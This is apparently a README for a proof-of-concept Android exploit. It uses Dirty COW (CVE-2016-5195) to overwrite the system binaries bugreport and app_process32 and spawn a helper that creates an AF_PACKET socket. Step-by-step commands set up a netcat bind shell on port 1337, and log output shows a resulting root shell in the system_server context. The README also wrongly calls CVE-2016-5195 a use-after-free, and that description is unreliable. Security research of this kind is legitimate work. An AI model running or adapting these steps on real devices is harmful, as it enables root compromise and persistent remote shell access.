# Creating an AF_PACKET on Android using CVE-2016-5195
Apparently (CVE-2016-8655 may be possible on Android):
> "On Android, processes with gid=3004/AID_NET_RAW are able to create AF_PACKET sockets (mediaserver) and can trigger the bug." (http://seclists.org/oss-sec/2016/q4/607, Philip Pettersson)

Currently this repo proves it is possible for an unpriveledged user to create an AF_PACKET socket on Android by using the dirty COW exploit (CVE-2016-5195).

CVE-2016-5195 is a use after free exploit:
>We then have a use-after-free on a timer object that can be
exploited by various poisoning attacks on the SLAB allocator (I find
add_key() to be the most reliable). This will ultimately lead to the
kernel jumping to a manipulated function pointer when the timer expires. (http://seclists.org/oss-sec/2016/q4/607, Philip Pettersson)

**TODO Determine if it is possible to manipulate the timer function pointer on Android. see chocobo_root.c**

1. Created an enviornment to monitor the android emulator SLABs.
   * Using LiME I can take snapshots of ram memory of the emulator.
   * Modified volatility to process the snapshots to identify the targeted AF_PACKET sk struct address.
2. Find a way to inject a 1024 object to exist in the freed sk object position in the slab
   * Wasted a bit of time with add_key(..) as suggested in the origin vulnerability documentation.
   * add_key(..) will work on the emulator but this will not work on my android device due to permission issues.
   * sendmmsg(..) maybe a possiblity?
3. Use 1. & 2. to see if it is even possible to attack the sk object that will ultimately run the race condition.


TODO Code privilege escalation function (if possible). Note: can not use the Ubuntu example (chocobo_root.c) as no vsyscall on android arm 32bit linux

This may help other people getting started though.

PoC only.

# Device Specifics
- Using a MOTO G4 Play (6.0.1 32 bit Android, Security Patch Middle 2016)
- Device SE Linux specifics:
  - I couldn't create an AF_Packet socket with my GID as 3004 and ID as ROOT. (context as shell)
  - My device SE Linux allows "net_raw" on the system_server.te

- Device specifics assumed files:
  - /system/bin/app_process32
  - /system/bin/bugreport
Make sure size(bugreport) < size(checksock) and size(app_process32) < size(appspawn)


# How To
- Setup your own Android.mk I just use a Makefile that has my NDK toolchain path in it.
```
$ make appspawn checksock
$ make dirtycow
$ adp() { for i in "$@"; do adb push $i /data/local/tmp; done; }
$ adp dirtycow checksock appspawn
$ adb shell
$ cp /system/bin/bugreport /data/local/tmp/bugreportold
$ cp /system/bin/app_process32 /data/local/tmp/app_process32old
$ /data/local/tmp/dirtycow /system/bin/bugreport /data/local/tmp/checksock
```
- Open a new window (Window 2) (start a logcat to watch the future output of checksock)
```
$ adb shell
$ logcat tcix:* *:S
```
- Open a new window (Window 3) (checksock will create a basic shell on 1337 once it starts, might be useful for the future)
```
$ adb shell
$ /data/local/tmp/nc -l 0.0.0.0 1337
```
- On the original window (if your phone screen is off, wake it up to cause a new app_process32 to spawn.):
- Note: your screen will go black or go to the splash image. (This is ok, and will be rectified when you reset app_process32 later)
```
$ adb shell 
$ /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/appspawn
```
- Watch Window 2, if check_sock is forked it will output to this log.You should see similar to the text below. 
- The text below should be printed over and over until you reset app_process32 (reboot or see below). 
- If you see in the log *Created a AF_PACKET socket*. It is possible to create an AF_PACKET on your device 
```
12-17 13:38:00.572 17885 17885 I tcshell : free of app_process32
12-17 13:38:00.572 17885 17885 I tcshell : opening sock
12-17 13:38:00.572 17885 17885 I tcshell : Created a socket
12-17 13:38:00.572 17885 17885 I tcshell : Created a AF_PACKET socket <---- Success
12-17 13:38:00.612 17885 17885 I tcshell : setting up socket...
12-17 13:38:00.612 17885 17885 I tcshell : was able to create socket??
12-17 13:38:00.612 17885 17885 I tcshell : Starting LSHirtycow /system/bin/app_process32 /data/local/tmp/app_process32old
```
- On Window 3 you should get a persistent shell in the system_server context
```
shell@harpia:/data/local/tmp $ ./nc -l 0.0.0.0 1337                  
> id
uid=0(root) gid=0(root) groups=0(root) context=u:r:system_server:s0
>
```
- App_process will keep spawning more checksockets. Reset app_process32 and bugreport:
```
$ adb shell
$ /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/app_process32old
$ /data/local/tmp/dirtycow /system/bin/bugreport /data/local/tmp/bugreport
```
